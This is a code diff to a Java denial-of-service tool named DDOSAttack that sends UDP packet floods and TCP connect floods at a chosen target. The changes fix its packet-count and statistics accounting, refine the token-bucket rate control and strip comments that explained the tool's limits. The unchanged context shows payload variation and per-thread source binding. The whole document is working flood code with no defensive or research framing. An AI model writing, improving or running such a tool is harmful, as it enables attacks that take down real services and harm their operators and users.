@@ -33,7 +33,7 @@ public class DDOSAttack {
     private static int packetSize = 1490;
     private static int numThreads = 4;
     private static int burstSize = 50;
-    private static double rateLimit = 0.0;  // seconds per burst
+    private static double rateLimit = 0.0;
     private static int duration = 0;
     private static int srcPortBase = -1;
     private static boolean randomTargetPort = false;
@@ -51,7 +51,7 @@ public class DDOSAttack {
     // Inner helpers
     // ===================================================================
 
-    /** Token bucket for precise long-term rate control with short bursts. */
+    /** Token bucket: precise long-term rate control with short bursts. */
     static class TokenBucket {
         private final double capacity;
         private final double refillPerSec;
@@ -249,24 +249,17 @@ public class DDOSAttack {
         System.out.println("  -P, --processes     Thread count (default 4)");
         System.out.println("  -b, --burst         Packets per burst (default 50)");
         System.out.println("  -r, --rate          Seconds per burst (default 0 = unlimited)");
-        System.out.println("                      Note: rate is now enforced by a token bucket,");
-        System.out.println("                      so the long-term rate is precise (burstSize/rate pps).");
+        System.out.println("                      Enforced by token bucket; long-term rate = burstSize/rate pps.");
         System.out.println("  -d, --duration      Duration in seconds (default 0 = until finished)");
         System.out.println("  -s, --src-port      Source port base (default -1 = random)");
         System.out.println("  --size              Base packet size (default 1490)");
         System.out.println("  --random-port       Randomize target port (UDP only)");
         System.out.println("  --bind-local        Bind each thread to a different local interface IP");
-        System.out.println("                      (Java has no raw socket; true source-IP spoofing is impossible)");
-        System.out.println("  --tcp               Use full TCP connect (not SYN flood; Java limitation)");
+        System.out.println("  --tcp               Use full TCP connect (not SYN flood)");
         System.out.println("  --vary / --no-vary  Enable/disable payload variation (default: enabled)");
         System.out.println("  --log <file>        Log file path");
         System.out.println("  --max-retries       Max send retries per packet (default 3)");
         System.out.println("  -h, --help          Show this help");
-        System.out.println();
-        System.out.println("[+] Notes:");
-        System.out.println("  * True source-IP spoofing requires raw sockets (C/Python+root), not available in Java.");
-        System.out.println("  * TCP mode uses full handshake; it's connect-flood, not SYN-flood.");
-        System.out.println("  * High PPS requires kernel tuning — see hints printed at startup.");
     }
 
     // ===================================================================
@@ -356,14 +349,6 @@ public class DDOSAttack {
     // ===================================================================
     // Payload pool (DirectByteBuffer)
     // ===================================================================
-    /**
-     * Builds a pool of pre-filled DirectByteBuffers.
-     * Variation:
-     *   - each buffer has random length ±10% around base size
-     *   - each buffer has random content
-     *   - the last 8 bytes are overwritten per-packet with a counter
-     *   - 16 random bytes near the beginning are XOR-flipped per packet
-     */
     private static List<ByteBuffer> buildDirectPayloadPool(int baseSize, int poolSize) {
         Random rnd = new Random();
         int delta = varyPayload ? Math.max(1, baseSize / 10) : 0;
@@ -384,7 +369,7 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // UDP attack (main path)
+    // UDP attack (main path) — FIXED: exact packet count, incremental stats
     // ===================================================================
     private static void startUdpAttack() throws Exception {
         ExecutorService executor = Executors.newFixedThreadPool(numThreads);
@@ -405,7 +390,6 @@ public class DDOSAttack {
                 DatagramChannel channel = null;
                 TokenBucket bucket = null;
                 if (rateLimit > 0) {
-                    // Allow short bursts of up to 2x burstSize
                     bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
                 }
 
@@ -415,13 +399,15 @@ public class DDOSAttack {
                     channel = openUdpChannelForThread(threadId);
                     InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);
 
+                    // NOTE: sent/bytesSent/dropped are CUMULATIVE counters.
+                    // They are NEVER reset. We only report the delta since last flush.
                     long sent = 0, bytesSent = 0, dropped = 0;
+                    long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
                     long packetCounter = 0;
 
                     while (!stopFlag && sent < pktCount) {
                         int toSend = (int) Math.min(burstSize, pktCount - sent);
 
-                        // --- Token bucket gate ---
                         if (bucket != null) {
                             long waitNs = bucket.nanosToWait(toSend);
                             if (waitNs > 0) {
@@ -442,7 +428,7 @@ public class DDOSAttack {
                                 buf.put(limit - 1 - b, (byte) (c & 0xFF));
                                 c >>>= 8;
                             }
-                            // XOR-flip 16 bytes near the beginning (index 4..19) for variation
+                            // XOR-flip 16 bytes near the beginning (index 4..19)
                             if (varyPayload && limit >= 24) {
                                 int base = 4;
                                 for (int b = 0; b < 16; b++) {
@@ -469,7 +455,6 @@ public class DDOSAttack {
                             } else {
                                 dropped++;
                                 consecutiveFailures++;
-                                // Exponential backoff on repeated failures
                                 if (consecutiveFailures >= 3) {
                                     long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
                                     Thread.sleep(backoffMs);
@@ -480,15 +465,25 @@ public class DDOSAttack {
                             }
                         }
 
-                        if (sent > 0) {
-                            totalSent.add(sent);
-                            totalBytes.add(bytesSent);
-                            totalDropped.add(dropped);
-                            sent = 0;
-                            bytesSent = 0;
-                            dropped = 0;
-                        }
+                        // Incremental flush: only add deltas, do NOT reset sent
+                        long dSent = sent - lastReportedSent;
+                        long dBytes = bytesSent - lastReportedBytes;
+                        long dDropped = dropped - lastReportedDropped;
+                        if (dSent > 0) totalSent.add(dSent);
+                        if (dBytes > 0) totalBytes.add(dBytes);
+                        if (dDropped > 0) totalDropped.add(dDropped);
+                        lastReportedSent = sent;
+                        lastReportedBytes = bytesSent;
+                        lastReportedDropped = dropped;
                     }
+
+                    // Final flush in case the loop exits with unreported deltas
+                    long dSent = sent - lastReportedSent;
+                    long dBytes = bytesSent - lastReportedBytes;
+                    long dDropped = dropped - lastReportedDropped;
+                    if (dSent > 0) totalSent.add(dSent);
+                    if (dBytes > 0) totalBytes.add(dBytes);
+                    if (dDropped > 0) totalDropped.add(dDropped);
 
                 } catch (Exception e) {
                     errOther.increment();
@@ -507,7 +502,7 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // TCP attack (connect flood; not SYN flood)
+    // TCP attack (connect flood; not SYN flood) — FIXED: exact packet count
     // ===================================================================
     private static void startTcpAttack() throws Exception {
         ExecutorService executor = Executors.newFixedThreadPool(numThreads);
@@ -528,7 +523,9 @@ public class DDOSAttack {
                     bindAddr = localAddresses.get(threadId % localAddresses.size());
                 }
 
+                // CUMULATIVE counters, never reset
                 long sent = 0, bytesSent = 0, dropped = 0;
+                long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
                 int consecutiveFailures = 0;
                 byte[] payload = new byte[Math.min(64, packetSize)];
                 new Random().nextBytes(payload);
@@ -580,15 +577,25 @@ public class DDOSAttack {
                         }
                     }
 
-                    if (sent > 0 || dropped > 0) {
-                        totalSent.add(sent);
-                        totalBytes.add(bytesSent);
-                        totalDropped.add(dropped);
-                        sent = 0;
-                        bytesSent = 0;
-                        dropped = 0;
-                    }
+                    // Incremental flush
+                    long dSent = sent - lastReportedSent;
+                    long dBytes = bytesSent - lastReportedBytes;
+                    long dDropped = dropped - lastReportedDropped;
+                    if (dSent > 0) totalSent.add(dSent);
+                    if (dBytes > 0) totalBytes.add(dBytes);
+                    if (dDropped > 0) totalDropped.add(dDropped);
+                    lastReportedSent = sent;
+                    lastReportedBytes = bytesSent;
+                    lastReportedDropped = dropped;
                 }
+
+                // Final flush
+                long dSent = sent - lastReportedSent;
+                long dBytes = bytesSent - lastReportedBytes;
+                long dDropped = dropped - lastReportedDropped;
+                if (dSent > 0) totalSent.add(dSent);
+                if (dBytes > 0) totalBytes.add(dBytes);
+                if (dDropped > 0) totalDropped.add(dDropped);
             };
             futures.add(executor.submit(task));
         }
@@ -679,7 +686,7 @@ public class DDOSAttack {
     }
 
     // ===================================================================
-    // UDP channel factory (larger SO_SNDBUF; per-thread local IP bind)
+    // UDP channel factory
     // ===================================================================
     private static DatagramChannel openUdpChannelForThread(int threadId) throws IOException {
         DatagramChannel channel = DatagramChannel.open();
@@ -688,7 +695,6 @@ public class DDOSAttack {
         DatagramSocket socket = channel.socket();
         try {
             socket.setReuseAddress(true);
-            // Try to enlarge send buffer to 4MB; ignore if unsupported
             try {
                 socket.setSendBufferSize(4 * 1024 * 1024);
             } catch (SocketException ignored) { }
